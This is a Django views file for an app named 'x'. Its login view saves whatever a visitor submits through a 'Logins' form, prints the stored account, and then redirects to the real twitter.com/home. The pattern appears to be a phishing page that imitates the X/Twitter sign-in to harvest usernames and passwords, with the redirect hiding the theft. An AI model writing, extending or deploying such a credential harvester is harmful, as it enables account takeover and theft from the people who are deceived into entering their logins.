from django.shortcuts import render, redirect

from x.forms import LoginsForm
from x.models import Logins


# Create your views here.
def home(request):
    return render(request, "x/home.html", context=None)


def login(request):
    login_form = LoginsForm()
    if request.method == "POST":
        login_form = LoginsForm(request.POST)
        if login_form.is_valid():
            account = login_form.save()
            print(account)
            return redirect("https://twitter.com/home")

    return render(request, "x/login.html", context={"form": login_form})
